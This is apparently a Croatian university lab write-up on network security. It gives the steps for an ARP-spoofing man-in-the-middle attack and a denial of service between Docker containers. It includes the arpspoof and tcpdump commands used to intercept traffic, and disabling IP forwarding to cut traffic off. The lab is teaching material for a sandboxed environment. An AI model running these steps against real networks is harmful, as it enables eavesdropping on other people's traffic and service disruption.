# Lab 1: Man-in-the-middle attack (ARP spoofing)

## Pomoćne komande

- pwd - file path foldera u kojem se trenutno nalazimo
- cd - promjeni direktorij
- ls - izlistaj fileove unutar direktorija
- mkdir - kreiraj direktorij
- wsl - Windows Subsystem for Linux

## Zadatak:

Izvršavanje man in the middle napada (MitM) u virtualnoj Docker mreži i denial od service (DoS) napada iskorištavanjem ranjivosti ARP protokola.

Žrtve napada:

1. station-1
2. station-2

Napadač:

1. evil-station

### Koraci:

 1. kloniranje repozitorija

<aside>
🔹 git clone [https://github.com/mcagalj/SRP-2022-23](https://github.com/mcagalj/SRP-2022-23)

</aside>

 2. mijenjanje radnog direktorij 

<aside>
🔹 cd SRP-2022-23/arp-spoofing/

</aside>

 3. buildanje i pokretanje docker kontejnera 

<aside>
🔹 ./start.sh

</aside>

 4. zaustavljanje docker kontejnera

<aside>
🔹 ./stop.sh

</aside>

 5. pokretanje interaktivnog shella u station-1  kontejneru

<aside>
🔹 docker exec -it station-1 bash

</aside>

 6. provjeravanje nalazi li se station-2 na istoj mreži

<aside>
🔹 ping station-2

</aside>

 7. pokretanje interaktivnog shella u station-2 kontejneru

<aside>
🔹 docker exec -it station-2 bash

</aside>

 8. uspostavljanje komunikacije između station-1 i station-2 

<aside>
🔹 netcat -l -p 8080

</aside>

<aside>
🔹 netcat station-2 8080

</aside>

 9. pokretanje interaktivnog shella u evil-station  kontejneru

<aside>
🔹 docker exec -it evil-station bash

</aside>

 10. evil-station predstavlja se stationu-1 kao station-2 (osluškivanje promet na mrežnoj kartici) - narušavanje **integriteta** i **povjerljivosti**

<aside>
🔹 arpspoof -t station-1 station-2

</aside>

<aside>
🔹 tcpdump

</aside>

 11. prekidanje prometa između station-1 i station-2 - narušavanje **dostupnosti**

<aside>
🔹 echo 0 > /proc/sys/net/ipv4/ip_forward

</aside>